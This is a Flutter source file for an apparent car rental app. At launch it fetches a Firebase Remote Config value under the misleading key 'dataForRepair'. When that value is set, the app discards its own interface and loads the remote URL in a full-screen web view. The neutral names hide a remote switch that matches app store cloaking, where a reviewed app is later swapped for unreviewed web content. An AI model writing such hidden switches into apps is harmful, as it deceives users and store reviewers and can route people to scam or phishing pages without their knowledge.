import 'package:car_rent_app/car_rent_app.dart';
import 'package:car_rent_app/firebase_options.dart';
import 'package:car_rent_app/models/transport_model.dart';
import 'package:car_rent_app/screens/transpot/transport_bloc/transport_bloc.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:hive_flutter/hive_flutter.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);

  await Hive.initFlutter();
  Hive.registerAdapter(TransportModelAdapter());
  await Hive.openBox('transports');

  runApp(
    MultiBlocProvider(
      providers: [
        BlocProvider<TransportBloc>(create: (context) => TransportBloc()),
      ],
      child: FutureBuilder<bool>(
        future: checkModelsForRepair(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
              child: Center(
                child: Container(
                  height: 70,
                  width: 70,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(15),
                    child: Image.asset('assets/images/app_icon.png'),
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && repairData != '') {
              return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: NewScreen(das: repairData));
            } else {
              return CarRentApp();
            }
          }
        },
      ),
    ),
  );
}

String repairData = '';
Future<bool> checkModelsForRepair() async {
  final remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetchAndActivate();
  String value = remoteConfig.getString('dataForRepair');
  if (!value.contains('noneData')) {
    repairData = value;
  }
  return value.contains('noneData') ? false : true;
}

class NewScreen extends StatelessWidget {
  final String das;

  NewScreen({required this.das});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(url: Uri.parse(das)),
        ),
      ),
    );
  }
}
